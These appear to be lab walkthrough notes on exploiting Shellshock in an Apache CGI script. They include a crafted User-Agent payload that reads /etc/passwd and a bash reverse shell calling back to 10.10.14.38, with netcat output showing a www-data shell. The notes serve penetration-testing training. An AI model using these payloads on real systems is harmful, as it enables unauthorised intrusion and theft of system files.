A graphical depiction of how CGI works can be seen below.
![](Pasted%20image%2020260802114517.png)
## Shellshock via CGI

```shell
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

If the system is not vulnerable, only `"not vulnerable"` will be printed.

```shell
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable" 

not vulnerable
```
## Hands-on Example
#### Enumeration - Gobuster

```shell
3kjS@htb[/htb]$ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```
![](Screenshot%202026-08-02%20at%2011.46.18.png)

```shell
3kjS@htb[/htb]$ curl -i http://10.129.204.231/cgi-bin/access.cgi
HTTP/1.1 200 OK 
Date: Thu, 23 Mar 2023 13:28:55 
GMT Server: Apache/2.4.41 (Ubuntu) 
Content-Length: 0 
Content-Type: text/html
```
#### Confirming the Vulnerability

```shell
3kjS@htb[/htb]$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```
#### Exploitation to Reverse Shell Access

```shell
3kjS@htb[/htb]$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

```shell
3kjS@htb[/htb]$ sudo nc -lvnp 7777 

listening on [any] 7777 ... 
connect to [10.10.14.38] from (UNKNOWN) [10.129.204.231] 52840 
bash: cannot set terminal process group (938): Inappropriate ioctl for device 
bash: no job control in this shell 
www-data@htb:/usr/lib/cgi-bin$ id 
id 
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
www-data@htb:/usr/lib/cgi-bin$
```
